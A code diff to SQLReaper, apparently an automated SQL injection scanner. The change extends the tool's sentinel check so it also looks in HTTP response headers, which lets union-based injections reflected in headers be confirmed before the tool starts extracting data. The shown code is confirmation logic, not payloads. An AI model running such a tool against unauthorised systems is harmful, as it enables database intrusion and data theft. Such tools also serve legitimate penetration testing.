@@ -1,10 +1,39 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v224 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 26, 2026)         ║
-║  v223 base + 3 additional fixes. v224 closes three more sentinel guard gaps in  ║
-║  PCV for U/UE/UH: A+C dual-check, D status-oracle, and WAF-oracle replay paths  ║
-║  could confirm UH without sentinel reflected. All UH FP cascade paths now closed.║
+║  SQLReaper v225 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 26, 2026)         ║
+║  v224 base + 1 critical fix. v225 fixes the UH sentinel false-negative: the     ║
+║  sentinel probe in _post_confirm_verify_locked checked only the response body,   ║
+║  but for UH (Union-Header injection) the UNION SELECT output appears in          ║
+║  response headers. This caused _sentinel_pass=False for ALL genuine UH           ║
+║  injections, blocking every sentinel-guarded confirmation path and making real   ║
+║  UH injection permanently unconfirmable after v219-v224 FP guards were added.   ║
+║                                                                                    ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v224 → v225) — 1 BUG FIXED                            ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V225-UH-SENTINEL-HEADER-FN (CRITICAL; UH technique; all DBMSes; all   ║
+║      surfaces; all cascade paths; after any v219-v224 sentinel guard was added): ║
+║      The sentinel probe in _post_confirm_verify_locked built a UNION ALL SELECT  ║
+║      payload and checked whether the sentinel value appeared in _sfp.body (the  ║
+║      HTTP response body). For UH (Union-Header injection) the UNION SELECT      ║
+║      output is reflected in a RESPONSE HEADER, not the body. The body-only      ║
+║      check therefore always fails for genuine UH: _sentinel_pass is set to      ║
+║      False, and every subsequent confirmation path (A-strong, Check C, A+D,     ║
+║      D-standalone, detection-replay, A+C dual, D-status-oracle, WAF-oracle      ║
+║      replay) is blocked by `_sentinel_pass is not True`. This turns all real    ║
+║      UH injections into false negatives — no UH injection can ever be confirmed ║
+║      after the v219-v224 FP guards are in place.                                ║
+║      Root cause: the sentinel reflection check did not look at response headers, ║
+║      only the body.                                                               ║
+║      Fix: in the `else:` branch where body sentinel check fails, additionally   ║
+║      check all response header values for the sentinel string when tech=="UH".  ║
+║      If found in any header value → return True, 3 (confirmed via header        ║
+║      sentinel, same as body confirmation). If not found in body OR headers →    ║
+║      _sentinel_pass=False (genuine UH FP, not a real UNION-header injection).   ║
+║      Also handle the case where _sfp.body is empty: add an elif branch that     ║
+║      checks headers when the outer body-presence guard fails for UH.            ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
 ║  FRESH EXAMINATION AUDIT (v223 → v224) — 3 BUGS FIXED                           ║
@@ -115070,9 +115099,32 @@ class TechniqueCascadeEngine:
                             pass  # non-fatal: proceed with unmodified value
                     _sfp = await self._safe_confirm(method, url, data, data_fmt,
                         param, _u_full_value, self.tamper_chain)
-                    if _sfp and _validate_response(_sfp, "_sfp_sentinel_check") and _SENTINEL.encode() in _sfp.body:
+                    # BUG-V225-UH-SENTINEL-HEADER-FIX: For UH (Union-Header injection) the
+                    # actual technique is "UH" but this block is always called with tech="U".
+                    # The UNION SELECT output appears in response HEADERS, not the body.
+                    # Body-only check always fails → genuine UH injections rejected (FN).
+                    # Fix: when det.technique=="UH", also check response header values for
+                    # the sentinel string, mirroring the fix in _post_confirm_verify_locked.
+                    _det_tech_uh_ipc = (getattr(det, 'technique', '') or '') if det else ''
+                    _sfp_sentinel_hdr_ipc = None
+                    if (_sfp and _validate_response(_sfp, "_sfp_sentinel_check")
+                            and _det_tech_uh_ipc == "UH"
+                            and _SENTINEL.encode() not in _sfp.body):
+                        try:
+                            for _hk_ipc, _hv_ipc in (getattr(_sfp, 'headers', {}) or {}).items():
+                                if _SENTINEL in str(_hv_ipc):
+                                    _sfp_sentinel_hdr_ipc = _hk_ipc
+                                    break
+                        except Exception:
+                            pass
+                    if (_sfp and _validate_response(_sfp, "_sfp_sentinel_check")
+                            and (_SENTINEL.encode() in _sfp.body
+                                 or _sfp_sentinel_hdr_ipc is not None)):
+                        _sfp_sent_loc = (f"header '{_sfp_sentinel_hdr_ipc}'"
+                                         if _sfp_sentinel_hdr_ipc else "body")
                         print(f"[+] PCV CONFIRMED [U] {dbms}  sentinel '{_SENTINEL}' "
-                              f"reflected in col {_ci}/{_n_cols}  SQL execution proven", flush=True)
+                              f"reflected in {_sfp_sent_loc} col {_ci}/{_n_cols}  "
+                              "SQL execution proven", flush=True)
                         # BUG-4A FIX: Set _SCAN_STOPPED immediately on U confirmation
                         # so all concurrent probe loops exit on their next iteration
                         # check, without waiting for the higher-level extraction guard.
@@ -118347,6 +118399,47 @@ class TechniqueCascadeEngine:
                     if _sfp_num and not WAFBlockDiscriminator.is_waf_block(_sfp_num) and _sfp_num.body:
                         if _sentinel_val in _safe_decode_body(_sfp_num, encoding="utf-8", errors='replace', func_name='extraction__sfp_num'):
                             _sfp = _sfp_num  # numeric context worked
+                # BUG-V225-UH-SENTINEL-HEADER-FIX: helper to fire sentinel confirmation
+                # (shared by body-found and header-found paths to avoid duplication).
+                async def _do_sentinel_confirm(_location_label):
+                    _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
+                    _SCAN_STOPPED[0] = True
+                    if not _EXTRACTION_ACTIVE[0]:
+                        try:
+                            await _start_extraction_safely()
+                        except Exception:
+                            if not _EXTRACTION_ACTIVE[0] and not _EXTRACTION_DONE[0]:
+                                with _EXTRACTION_LOCK_GUARD:
+                                    if not _EXTRACTION_ACTIVE[0] and not _EXTRACTION_DONE[0]:
+                                        _EXTRACTION_ACTIVE[0] = True
+                    try:
+                        _cev_sent_h = (getattr(self, '_confirmed_event', None) or
+                                       getattr(getattr(self, 'config', None), '_confirmed_event', None))
+                        if _cev_sent_h and not _cev_sent_h.is_set():
+                            try:
+                                _cev_sent_h._bg_result = det
+                            except Exception:
+                                pass
+                            _cev_sent_h.set()
+                        _gate_sent_h = getattr(self, '_gate', None)
+                        if _gate_sent_h and not getattr(_gate_sent_h, 'killed', True):
+                            _gate_sent_h.kill()
+                    except Exception:
+                        pass
+                    return True, 3, {"sentinel": f"reflected:{_location_label}:{_sentinel_val}"}
+
+                # BUG-V225-UH-SENTINEL-HEADER-FIX: helper — check response headers
+                # for sentinel value; used when body check fails for UH technique.
+                def _sentinel_in_headers(_fp):
+                    try:
+                        _hdrs = dict(getattr(_fp, 'headers', {}) or {})
+                        for _hk, _hv in _hdrs.items():
+                            if _sentinel_val in str(_hv):
+                                return _hk
+                    except Exception:
+                        pass
+                    return None
+
                 if _sfp and not WAFBlockDiscriminator.is_waf_block(_sfp) and _sfp.body:
                     _sbody = _safe_decode_body(_sfp, encoding="utf-8", errors="replace", func_name="extraction")
                     if _sentinel_val in _sbody:
@@ -118369,48 +118462,68 @@ class TechniqueCascadeEngine:
                         print(f"[*]   [PCV] Sentinel '{_sentinel_val}' REFLECTED in body"
                               "  UNION confirmed (CDN-immune)", flush=True)
                         print("[*]   [PCV] Result: CONFIRMED  reflected sentinel", flush=True)
-                        _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
-                        _SCAN_STOPPED[0] = True
-                        # Pre-set extraction gate so it is open before any extraction
-                        # coroutine fires its first binary-search probe.
-                        # BUG-R5-UNION-PCV-FIX (Req 5): Use _start_extraction_safely() to atomically
-                        # claim the extraction slot without TOCTOU race.
-                        if not _EXTRACTION_ACTIVE[0]:
-                            try:
-                                await _start_extraction_safely()
-                            except Exception:
-                                # FIX-R5-A: Use lock-protected fallback for TOCTOU safety
-                                # BUG-EXDONE-FALLBACK-FIX (Issue 5): Also check _EXTRACTION_DONE
-                                # so a second injection found after extraction completes cannot
-                                # start a parallel extraction run via this fallback path.
-                                if not _EXTRACTION_ACTIVE[0] and not _EXTRACTION_DONE[0]:
-                                    with _EXTRACTION_LOCK_GUARD:
-                                        if not _EXTRACTION_ACTIVE[0] and not _EXTRACTION_DONE[0]:
-                                            _EXTRACTION_ACTIVE[0] = True
-                        # Fire _confirmed_event and kill circuit-breaker gate so
-                        # header-batch loops polling cev.is_set() stop immediately.
-                        try:
-                            _cev_sent = (getattr(self, '_confirmed_event', None) or
-                                         getattr(getattr(self, 'config', None), '_confirmed_event', None))
-                            if _cev_sent and not _cev_sent.is_set():
-                                # FIX-BG-RESULT-SENTINEL: Set ._bg_result BEFORE .set() so the
-                                # BG failsafe in _v14_cascade recovers the DetectionResult even
-                                # when the BG task is cancelled at the next await after this fires.
+                        return await _do_sentinel_confirm("body")
+                    else:
+                        # BUG-V225-UH-SENTINEL-HEADER-FIX: For UH (Union-Header injection),
+                        # UNION SELECT output appears in response HEADERS, not the body.
+                        # Body check always fails for genuine UH → _sentinel_pass=False
+                        # → every sentinel-guarded path blocked → genuine UH is a
+                        # permanent false-negative after v219-v224 FP guards.
+                        # Fix: for tech="UH", check response header values for the sentinel.
+                        if tech == "UH":
+                            _uh_hdr_key = _sentinel_in_headers(_sfp)
+                            if _uh_hdr_key is None:
+                                # Sentinel absent from body AND headers — try numeric probe headers
                                 try:
-                                    _cev_sent._bg_result = det
+                                    _sfp_num_uh, _, _, _ = await _pcv_send(_sfx_num)
+                                    if (_sfp_num_uh and
+                                            not WAFBlockDiscriminator.is_waf_block(_sfp_num_uh)):
+                                        _uh_hdr_key = _sentinel_in_headers(_sfp_num_uh)
+                                        if _uh_hdr_key:
+                                            _sfp = _sfp_num_uh
                                 except Exception:
                                     pass
-                                _cev_sent.set()
-                            _gate_sent = getattr(self, '_gate', None)
-                            if _gate_sent and not getattr(_gate_sent, 'killed', True):
-                                _gate_sent.kill()
+                            if _uh_hdr_key:
+                                print(f"[*]   [PCV] Sentinel '{_sentinel_val}' REFLECTED in "
+                                      f"response header '{_uh_hdr_key}'  UH injection confirmed "
+                                      "(CDN-immune)", flush=True)
+                                print("[*]   [PCV] Result: CONFIRMED  reflected sentinel "
+                                      "(response header)", flush=True)
+                                return await _do_sentinel_confirm(f"header:{_uh_hdr_key}")
+                            else:
+                                _sentinel_pass = False
+                                print(f"[*]   [PCV] Sentinel '{_sentinel_val}' NOT reflected "
+                                      "in body or response headers  UH FP (CDN variation / "
+                                      "error routing, UNION output not in headers)", flush=True)
+                        else:
+                            _sentinel_pass = False
+                            print(f"[*]   [PCV] Sentinel '{_sentinel_val}' NOT reflected"
+                                  "  body-size signal is CDN cache variation", flush=True)
+                elif tech == "UH" and _sfp and not WAFBlockDiscriminator.is_waf_block(_sfp):
+                    # BUG-V225-UH-SENTINEL-HEADER-FIX: Body was empty or absent (redirect /
+                    # header-only response).  For UH, check response headers directly.
+                    _uh_hdr_key2 = _sentinel_in_headers(_sfp)
+                    if _uh_hdr_key2 is None:
+                        try:
+                            _sfp_num_uh2, _, _, _ = await _pcv_send(_sfx_num)
+                            if (_sfp_num_uh2 and
+                                    not WAFBlockDiscriminator.is_waf_block(_sfp_num_uh2)):
+                                _uh_hdr_key2 = _sentinel_in_headers(_sfp_num_uh2)
+                                if _uh_hdr_key2:
+                                    _sfp = _sfp_num_uh2
                         except Exception:
                             pass
-                        return True, 3, {"sentinel": f"reflected:{_sentinel_val}"}
+                    if _uh_hdr_key2:
+                        print(f"[*]   [PCV] Sentinel '{_sentinel_val}' REFLECTED in response "
+                              f"header '{_uh_hdr_key2}' (no body)  UH injection confirmed",
+                              flush=True)
+                        print("[*]   [PCV] Result: CONFIRMED  reflected sentinel "
+                              "(response header, no body)", flush=True)
+                        return await _do_sentinel_confirm(f"header_nobody:{_uh_hdr_key2}")
                     else:
                         _sentinel_pass = False
-                        print(f"[*]   [PCV] Sentinel '{_sentinel_val}' NOT reflected"
-                              "  body-size signal is CDN cache variation", flush=True)
+                        print(f"[*]   [PCV] Sentinel '{_sentinel_val}' NOT reflected in "
+                              "body or response headers  UH FP", flush=True)
                 # WAF block on sentinel probe → inconclusive (don't block other checks)
             except Exception as _se:
                 LOG.debug(f"PCV sentinel check: {_se}")
